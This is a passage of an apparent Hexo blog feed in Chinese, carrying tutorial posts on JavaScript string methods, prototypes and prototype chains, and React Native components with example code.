true</span></span><br><span class="line"><span class="built_in">console</span>.log(str.startsWith(<span class="string">'ab'</span>)) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(str.endsWith(<span class="string">'fg'</span>)) <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li><li><p>repeat() 将源字符串复制一遍，返回新的字符串 </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 参数是小数 会被取整，0返回空，Infinity或负数会报错，NaN等同于0</span></span><br><span class="line"><span class="built_in">console</span>.log(str.repeat(<span class="number">3</span>)) <span class="comment">// abcdefgabcdefgabcdefg</span></span><br></pre></td></tr></table></figure></li><li><p>padStart() 、padEnd() 字符串补全 </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果某个字符串不够指定长度，会在头部或尾部补全长度</span></span><br><span class="line"><span class="built_in">console</span>.log(str.padStart(<span class="number">10</span>,<span class="string">'0'</span>)) <span class="comment">// 000abcdefg</span></span><br><span class="line"><span class="built_in">console</span>.log(str.padEnd(<span class="number">10</span>,<span class="string">'0'</span>)) <span class="comment">// abcdefg000</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="获取字符串中出现最多的字符和次数"><a href="#获取字符串中出现最多的字符和次数" class="headerlink" title="获取字符串中出现最多的字符和次数"></a>获取字符串中出现最多的字符和次数</h2><ul><li>将字符串变化一种格式：字符串的每一个字符作为对象的键，字符出现的次数作为值，这就形成一个新的对象。</li><li>遍历这个对象，比较每一个键值对的值，取最大的键值对，即得到字符串出现最多的字符和出现的次数。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="comment">/* 判断一个字符串中出现最多的字符和出现的次数 */</span></span><br><span class="line">  <span class="keyword">var</span> str = <span class="string">'aabbccddd'</span>;</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;&#125;; <span class="comment">/* 定义一个空的对象来接收结果 */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.length; i++) &#123;</span><br><span class="line">    <span class="comment">/* charAt获取字符串的索引 */</span></span><br><span class="line">    <span class="comment">/* 判断obj是否存在一个为 obj[str.charAt(i)] 的键</span></span><br><span class="line"><span class="comment">       如果不存在，那么就添加这个键，并且赋值为 1 </span></span><br><span class="line"><span class="comment">       如果已经存在这个键，那么就给这个键的值加1 */</span></span><br><span class="line">    <span class="keyword">if</span> (!obj[str.charAt(i)]) &#123;</span><br><span class="line">      obj[str.charAt(i)] = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      obj[str.charAt(i)]++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(obj);</span><br><span class="line">  <span class="comment">/* 假设一个为0的值 和 一个空的字符串来存放键</span></span><br><span class="line"><span class="comment">  for in 遍历obj对象 然后把每一个值和max对比</span></span><br><span class="line"><span class="comment">  然后获取最大的值max 和 最大值对应的键maxno */</span></span><br><span class="line">  <span class="keyword">var</span> max = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> maxno = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> k <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj[k] &gt; max) &#123;</span><br><span class="line">      max = obj[k];</span><br><span class="line">      maxno = k;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(max + <span class="string">' '</span> + maxno);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;字符串常用方法&quot;&gt;&lt;a href=&quot;#字符串常用方法&quot; class=&quot;headerlink&quot; title=&quot;字符串常用方法&quot;&gt;&lt;/a&gt;字符串常用方法&lt;/h1&gt;&lt;p&gt;​    字符串所有的方法，都 &lt;strong&gt;不会修改字符串本身&lt;/strong&gt;(字符串是不可变
      
    
    </summary>
    
      <category term="JavasCript" scheme="http://yoursite.com/categories/JavasCript/"/>
    
    
      <category term="JavasCript" scheme="http://yoursite.com/tags/JavasCript/"/>
    
  </entry>
  
  <entry>
    <title>js中的原型及原型链</title>
    <link href="http://yoursite.com/posts/8814181e.html"/>
    <id>http://yoursite.com/posts/8814181e.html</id>
    <published>2020-06-18T07:09:21.435Z</published>
    <updated>2020-06-18T07:09:21.436Z</updated>
    
    <content type="html"><![CDATA[<h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>概念：首先，对象是<code>JavaScript</code>中的一个基本数据类型，是一种复合值；它用一个（对象）名字命名，把一系列的属性和方法都包装在一个集合中，可以对象名访问这些属性和方法，即属性的无序集合。</p><h4 id="通过字面量创建对象"><a href="#通过字面量创建对象" class="headerlink" title="通过字面量创建对象"></a>通过字面量创建对象</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过字面量创建对象</span></span><br><span class="line"><span class="keyword">var</span> obj1 = &#123;</span><br><span class="line">        name:<span class="string">'Jack'</span>,</span><br><span class="line">        age: <span class="number">18</span></span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h4 id="通过系统自带的构造函数构造对象"><a href="#通过系统自带的构造函数构造对象" class="headerlink" title="通过系统自带的构造函数构造对象"></a>通过系统自带的构造函数构造对象</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过系统自带的构造函数构造对象</span></span><br><span class="line"><span class="comment">// 其他构造函数有：new Array(),new Number,new Date(),new Boolean()</span></span><br><span class="line"> <span class="keyword">var</span> obj2 = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"> obj2.name = <span class="string">'Jack'</span>;</span><br><span class="line"> obj2.age = <span class="number">18</span>;</span><br></pre></td></tr></table></figure><h4 id="通过自定义函数构造对象"><a href="#通过自定义函数构造对象" class="headerlink" title="通过自定义函数构造对象"></a>通过自定义函数构造对象</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过自定义函数构造对象</span></span><br><span class="line"><span class="comment">// 为了和普通函数区别，构造函数命名首字母要大写（帕斯卡命名法）</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Obj3</span>(<span class="params">name,age</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.name = name;</span><br><span class="line">      <span class="keyword">this</span>.age = age;</span><br><span class="line">      <span class="keyword">this</span>.sayHi = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(<span class="keyword">this</span>.name)</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> dx1 = <span class="keyword">new</span> Obj3(<span class="string">'Jack'</span>, <span class="number">18</span>);</span><br><span class="line">    <span class="keyword">var</span> dx2 = <span class="keyword">new</span> Obj3(<span class="string">'Brush'</span>, <span class="number">18</span>);</span><br></pre></td></tr></table></figure><h4 id="new关键字"><a href="#new关键字" class="headerlink" title="new关键字"></a>new关键字</h4><p>首先，我先说下自定义构造函数创建对象的基本流程，使用new和不适用new差别很大，不用new的话，则<code>Obj3(name)</code>就作为一个普通的函数执行（只是函数名的首字母大写了），没有返回值，那么默认返回的是<code>undefined</code>，而用<code>new</code>关键字后，JS就会把该函数作为一个构造函数看待，经过一系列的隐式操作，返回值是一个对象了。</p><p>new关键字的“隐式操作”：</p><p>①在内存中创建一个空的Object类型的对象—-看不到</p><p>②让this关键字指向这个空的对象（将构造函数的作用域赋给新对象）—-看不到</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ① ② 的执行过程</span></span><br><span class="line"><span class="keyword">var</span> <span class="keyword">this</span> = <span class="built_in">Object</span>.creat(Obj3.prototype);</span><br><span class="line"><span class="comment">// this 指向 Obj3.prototype(后面讲到)</span></span><br><span class="line"><span class="comment">// 可以看出构造函数创建对象的最根本原理是借用Object.create()方法来实现的，只不过被封装功能化了</span></span><br></pre></td></tr></table></figure><p>在前面的例子中，<code>dx1</code>和<code>dx2</code>分别保存着<code>Obj3</code>的一个不同的实例。这俩个对象都有有一个<code>constructor</code>（构造函数）的属性，该属性指向<code>Obj3</code>，如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(dx1.constructor  == Obj3) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(dx2.constructor  == Obj3) <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>对象的constructor属性最初用来表示对象类型的。但是，检测对象类型，还是<code>instanceof</code>操作符要更可靠一些—–用来检测一个对象在其原型链中，是否存在一个构造函数的<code>prototype</code>属性。</p><p>我们在这个例子中创建的所有对象即使<code>Object</code>的实例，同时也是<code>Obj3</code>的实例，这一点可以通过<code>instanceof</code>操作符可以得到验证。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="built_in">console</span>.log(dx1 <span class="keyword">instanceof</span> Obj3);  <span class="comment">// true</span></span><br><span class="line">   <span class="built_in">console</span>.log(dx1 <span class="keyword">instanceof</span> <span class="built_in">Object</span>);  <span class="comment">// true</span></span><br><span class="line">   <span class="built_in">console</span>.log(dx2 <span class="keyword">instanceof</span> Obj3);  <span class="comment">// true</span></span><br><span class="line">   <span class="built_in">console</span>.log(dx2 <span class="keyword">instanceof</span> <span class="built_in">Object</span>);  <span class="comment">// true</span></span><br><span class="line"><span class="comment">// dx1 和 dx2 之所以同时是Object的实例，是因为所有的对象均继承自Object</span></span><br></pre></td></tr></table></figure><p>③通过this给这个对象添加属性和方法—看得见</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// this.name = 'Jack';</span></span><br><span class="line">   <span class="keyword">this</span>.age = <span class="number">18</span>;</span><br></pre></td></tr></table></figure><p>④将这个对象返回给用<code>new</code>关键字调用的构造函数<code>Obj3(name)</code>的调用者（<code>dx1</code>）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>;</span><br></pre></td></tr></table></figure><p>注：<code>Object</code>在JS中，所有不同类型的对象，都直接或间接的集成于它。</p><h3 id="原型对象和原型链"><a href="#原型对象和原型链" class="headerlink" title="原型对象和原型链"></a>原型对象和原型链</h3><h4 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h4><p>我们所创建的每一个函数都有一个 prototype （原型）的属性，这个属性是一个指针，指向一个对象，而这个对象的用途包含可以由特定类型的所有实例共享的属性和方法。 </p><p>那么prototype就可以通过调用构造函数而创建的那个对象实例的原型对象。使用原型对象的好处是可以让所有对象实例共享它所包含的属性和方法。换句话说，不必在构造函数中第一对象实例的信息，而是可以将这些信息直接添加到原型对象中去，那么上面的Obj3（）函数就可以写成这样：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">Obj3</span>(<span class="params">name,age</span>) </span>&#123;</span><br><span class="line">     <span class="keyword">this</span>.name = name;</span><br><span class="line">     <span class="keyword">this</span>.age = age;</span><br><span class="line">   &#125;</span><br><span class="line">Obj3.prototype.sayHi = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">     alert(<span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line">   <span class="keyword">var</span> dx1 = <span class="keyword">new</span> Obj3(<span class="string">'Jack'</span>, <span class="number">18</span>);</span><br><span class="line">   <span class="keyword">var</span> dx2 = <span class="keyword">new</span> Obj3(<span class="string">'Brush'</span>, <span class="number">18</span>);</span><br></pre></td></tr></table></figure><p>在默认情况下，所有原型对象都会自动获得一个constructor（构造函数）属性，这个属性包含一个指向prototype属性所在函数的指针。就拿上面的例子来说，Obj3.prototype.constructor指向Obj3。而通过这个构造函数，我们还可以继续为原型对象添加其他属性和方法。</p><p>当构造函数创建一个新实例后，该实例的内部将包含一个指针（内部属性），指向构造函数的原型方法。在每一个对象都支持一个属性：”_ <em>proto</em> _”。</p><p>我们可以通过isPrototype()方法来确定对象之间是否存在这个关系。从本质上讲，如果[Prototype]指向调用isPrototype()方法的对象（Obj3.prototype），那么这个方法就返回true：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(dx1.prototype.isPrototypeOf(Obj3)); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(dx2.prototype.isPrototypeOf(Obj3)); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>使用hasOwnProperty()可以检测一个属性是否存在在实例中，还是存在在原型中。这个方法（从Object继承来的）只是给定属性存在在对象实例中，才会返回true；存在在原型中，返回false。</p><h4 id="原型对象的原型"><a href="#原型对象的原型" class="headerlink" title="原型对象的原型"></a>原型对象的原型</h4><p>所有的原型应用类型（Object、Array、String）都在其构造函数的原型上定义了方法。在Array.prototype中可以找到sort（）方法；在String.prototype中可以找到substring（）方法，如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Array</span>.prototype.sort); <span class="comment">// ƒ sort() &#123; [native code] &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">String</span>.prototype.substring); <span class="comment">// ƒ substring() &#123; [native code] &#125;</span></span><br></pre></td></tr></table></figure><h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p>原型和实例的关系：每个构造函数都有一个原型对象，原型对象都包含一个指向构造函数的指针，而实例都包含一个指向原型对象的内部指针。如果，我们让这个原型对象等于另一个类型的实例，显然，此时的原型对象包含一个指向另一个原型的指针，相应的，另一个原型中野包含着指向另另一个类型的实例，那么，层层递进，就构成了实例与原型的链条，这就是原型链的基本概念。</p><p>我们知道，所有引用类型默认都继承了Object，而这个继承也是通过原型链实现的。所有函数的默认原型都是Object的实例，因此默认原型都包含一个内部指针，指向<code>Object.prototype</code>。这正是所有自定义类型都会继承<code>toString()、valueOf()</code>等默认方式的根本原因。</p><p><img src="/view/posts/8814181e/prototype.jpg" alt="原型"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;对象&quot;&gt;&lt;a href=&quot;#对象&quot; class=&quot;headerlink&quot; title=&quot;对象&quot;&gt;&lt;/a&gt;对象&lt;/h3&gt;&lt;p&gt;概念：首先，对象是&lt;code&gt;JavaScript&lt;/code&gt;中的一个基本数据类型，是一种复合值；它用一个（对象）名字命名，把一系列的属性
      
    
    </summary>
    
      <category term="JavasCript" scheme="http://yoursite.com/categories/JavasCript/"/>
    
    
      <category term="JavasCript" scheme="http://yoursite.com/tags/JavasCript/"/>
    
  </entry>
  
  <entry>
    <title>RN基础入门</title>
    <link href="http://yoursite.com/posts/e61ae078.html"/>
    <id>http://yoursite.com/posts/e61ae078.html</id>
    <published>2020-03-31T08:14:14.000Z</published>
    <updated>2020-06-18T07:09:21.404Z</updated>
    
    <content type="html"><![CDATA[<h1 id="入门基础"><a href="#入门基础" class="headerlink" title="入门基础"></a>入门基础</h1><h2 id="核心组件和原生组件"><a href="#核心组件和原生组件" class="headerlink" title="核心组件和原生组件"></a>核心组件和原生组件</h2><h3 id="原生组件"><a href="#原生组件" class="headerlink" title="原生组件"></a>原生组件</h3><p>使用React Native，您可以使用React组件通过JavaScript调用Android 和IOS视图。 在运行时，React Native为这些组件创建相应的Android和iOS视图。 由于React Native组件具有与Android和iOS相同的视图支持，因此React Native应用的外观，感觉和性能与其他任何应用一样。 我们将这些平台支持的组件称为“本机组件”。</p><p>通过React Native，您可以为Android和iOS构建自己的Native Components，以满足您应用的独特需求。 我们还有一个由社区贡献的组成部分的繁荣生态系统。 查看本机目录以查找社区正在创建的内容。</p><p>React Native还包括一组基本的，随时可用的Native组件，您可以使用它们立即开始构建您的应用程序。 这些是React Native的核心组件。</p><h3 id="核心组件"><a href="#核心组件" class="headerlink" title="核心组件"></a>核心组件</h3><p>React Native具有许多核心组件，从表单控件到活动指示器，应有尽有。 您可以在API部分找到所有记录的文档。 您将主要使用以下核心组件：</p><table><thead><tr><th style="text-align:left">RN UI 组件</th><th style="text-align:left">ANDROID VIEW</th><th style="text-align:left">IOS VIEW</th><th style="text-align:left">WEB ANALOG</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left"><code>&lt;View&gt;</code></td><td style="text-align:left"><code>&lt;ViewGroup&gt;</code></td><td style="text-align:left"><code>&lt;UIView&gt;</code></td><td style="text-align:left">A non-scrollling <code>&lt;div&gt;</code></td><td style="text-align:left">支持flexbox布局、样式、一些触摸处理和可访问性控制的容器</td></tr><tr><td style="text-align:left"><code>&lt;Text&gt;</code></td><td style="text-align:left"><code>&lt;TextView&gt;</code></td><td style="text-align:left"><code>&lt;UITextView&gt;</code></td><td style="text-align:left"><code>&lt;p&gt;</code></td><td style="text-align:left">显示，设置样式和嵌套文本字符串，甚至处理触摸事件</td></tr><tr><td style="text-align:left"><code>&lt;Image&gt;</code></td><td style="text-align:left"><code>&lt;ImageView&gt;</code></td><td style="text-align:left"><code>&lt;UIImageView&gt;</code></td><td style="text-align:left"><code>&lt;img&gt;</code></td><td style="text-align:left">显示不同类型的图像</td></tr><tr><td style="text-align:left"><code>&lt;ScrollView&gt;</code></td><td style="text-align:left"><code>&lt;ScrollView&gt;</code></td><td style="text-align:left"><code>&lt;UIScrollView&gt;</code></td><td style="text-align:left"><code>&lt;div&gt;</code></td><td style="text-align:left">通用滚动容器，可以包含多个组件和视图</td></tr><tr><td style="text-align:left"><code>&lt;TextInput&gt;</code></td><td style="text-align:left"><code>&lt;EditText&gt;</code></td><td style="text-align:left"><code>&lt;UITextField&gt;</code></td><td style="text-align:left"><code>&lt;input type=&quot;text&quot;&gt;</code></td><td style="text-align:left">允许用户输入文字</td></tr></tbody></table><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; useState &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; View, Text, Image, ScrollView, TextInput, FlatList &#125; <span class="keyword">from</span> <span class="string">'react-native'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;ScrollView&gt;</span><br><span class="line">      &lt;Text&gt;Some text&lt;<span class="regexp">/Text&gt;</span></span><br><span class="line"><span class="regexp">      &lt;View&gt;</span></span><br><span class="line"><span class="regexp">        &lt;Text&gt;Some moqqqre text&lt;/</span>Text&gt;</span><br><span class="line">        &lt;Image source=&#123;&#123;<span class="attr">uri</span>: <span class="string">'bd'</span>&#125;&#125; style=&#123;&#123;<span class="attr">width</span>: <span class="number">200</span>, <span class="attr">height</span>: <span class="number">200</span>&#125;&#125;&gt;&lt;/Image&gt;</span><br><span class="line">        &lt;Image source=&#123;<span class="built_in">require</span>(<span class="string">'./1.png'</span>)&#125; style=&#123;&#123;<span class="attr">width</span>: <span class="number">200</span>, <span class="attr">height</span>: <span class="number">200</span>, <span class="attr">borderColor</span>: <span class="string">'gray'</span>,  <span class="attr">borderWidth</span>: <span class="number">1</span>&#125;&#125;/&gt;</span><br><span class="line">        &lt;Image source=&#123;&#123;<span class="attr">uri</span>: <span class="string">"https://facebook.github.io/react-native/docs/assets/p_cat2.png"</span>&#125;&#125; style=&#123;&#123;<span class="attr">width</span>: <span class="number">200</span>, <span class="attr">height</span>: <span class="number">200</span>&#125;&#125;/&gt;</span><br><span class="line">      &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">      &lt;TextInput</span></span><br><span class="line"><span class="regexp">        style=&#123;&#123;</span></span><br><span class="line"><span class="regexp">          height: 40,</span></span><br><span class="line"><span class="regexp">          borderColor: 'gray',</span></span><br><span class="line"><span class="regexp">          borderWidth: 1</span></span><br><span class="line"><span class="regexp">        &#125;&#125;</span></span><br><span class="line"><span class="regexp">        defaultValue="You can type in me"</span></span><br><span class="line"><span class="regexp">      /</span>&gt;</span><br><span class="line">    &lt;<span class="regexp">/ScrollView&gt;</span></span><br><span class="line"><span class="regexp">  )</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default App;</span></span><br></pre></td></tr></table></figure><h2 id="React基础"><a href="#React基础" class="headerlink" title="React基础"></a>React基础</h2><h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3><h4 id="Function-Component"><a href="#Function-Component" class="headerlink" title="Function Component"></a>Function Component</h4> <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Text &#125; <span class="keyword">from</span> <span class="string">'react-native'</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">Cat</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;Text&gt;Hello, I am your cat!&lt;/Text&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Class-Component"><a href="#Class-Component" class="headerlink" title="Class Component"></a>Class Component</h4><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Text &#125; <span class="keyword">from</span> <span class="string">'react-native'</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;Text&gt;Hello, I am your cat!&lt;/Text&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这两种不同的组件之间的<strong>本质区别就是</strong>：有无state属性 和 生命周期函数！</p><h3 id="JSX"><a href="#JSX" class="headerlink" title="JSX"></a>JSX</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Text &#125; <span class="keyword">from</span> <span class="string">'react-native'</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">Cat</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getFullName</span>(<span class="params">firstName, secondName, thirdName</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> firstName + <span class="string">" "</span> + secondName + <span class="string">" "</span> + thirdName;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;Text&gt;</span><br><span class="line">      Hello, I am &#123;getFullName(<span class="string">"Rum"</span>, <span class="string">"Tum"</span>, <span class="string">"Tugger"</span>)&#125;!</span><br><span class="line">    &lt;<span class="regexp">/Text&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="自定义组件"><a href="#自定义组件" class="headerlink" title="自定义组件"></a>自定义组件</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Button, Text, View &#125; <span class="keyword">from</span> <span class="string">"react-native"</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123; <span class="attr">isHungry</span>: <span class="literal">true</span> &#125;;</span><br><span class="line">  render(props) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;View&gt;</span><br><span class="line">        &lt;Text&gt;</span><br><span class="line">          I am &#123;<span class="keyword">this</span>.props.name&#125;, and I am</span><br><span class="line">          &#123;<span class="keyword">this</span>.state.isHungry ? <span class="string">" hungry"</span> : <span class="string">" full"</span>&#125;!</span><br><span class="line">        &lt;<span class="regexp">/Text&gt;</span></span><br><span class="line"><span class="regexp">        &lt;Button</span></span><br><span class="line"><span class="regexp">          onPress=&#123;() =&gt; &#123;</span></span><br><span class="line"><span class="regexp">            this.setState(&#123; isHungry: false &#125;);</span></span><br><span class="line"><span class="regexp">          &#125;&#125;</span></span><br><span class="line"><span class="regexp">          disabled=&#123;!this.state.isHungry&#125;</span></span><br><span class="line"><span class="regexp">          title=&#123;</span></span><br><span class="line"><span class="regexp">            this.state.isHungry ? "Pour me some milk, please!" : "Thank you!"</span></span><br><span class="line"><span class="regexp">          &#125;</span></span><br><span class="line"><span class="regexp">        /</span>&gt;</span><br><span class="line">      &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span 